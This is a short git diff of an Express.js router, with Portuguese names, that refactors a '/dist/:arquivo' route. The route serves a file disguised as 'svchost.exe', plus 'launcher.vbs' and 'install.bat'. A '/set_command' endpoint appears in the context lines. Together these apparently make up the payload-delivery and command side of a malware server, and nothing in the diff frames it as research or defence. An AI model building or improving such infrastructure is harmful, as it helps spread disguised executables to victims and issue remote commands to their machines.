@@ -36,17 +36,28 @@ function handleResult(result) {
 
 
 router.get("/dist/:arquivo", (req, res) => {
-    const arquivo = req.params.arquivo;
+    let filePath;
 
-    if (arquivo === "hihat") {
-        res.sendFile(path.join(__dirname, "../client/svchost.exe"));
-    } else if (arquivo === "launcher") {
-        res.sendFile(path.join(__dirname, "../client/launcher.vbs"));
-    } else if (arquivo === "install") {
-        res.sendFile(path.join(__dirname, "../client/install.bat"));
-    } else {
-        res.status(404).send("Arquivo não encontrado");
+    switch (req.params.arquivo) {
+        case "hihat":
+            filePath = path.join(__dirname, "../client/svchost.exe");
+            break;
+        case "launcher":
+            filePath = path.join(__dirname, "../client/launcher.vbs");
+            break;
+        case "install":
+            filePath = path.join(__dirname, "../client/install.bat");
+            break;
+        default:
+            return res.status(404).send("Arquivo não encontrado");
     }
+
+    res.sendFile(filePath, err => {
+        if (err) {
+            console.error("Erro ao enviar o arquivo:", err);
+            res.status(500).send("Erro interno");
+        }
+    });
 });
 
 router.post("/set_command", async (req, res) => {
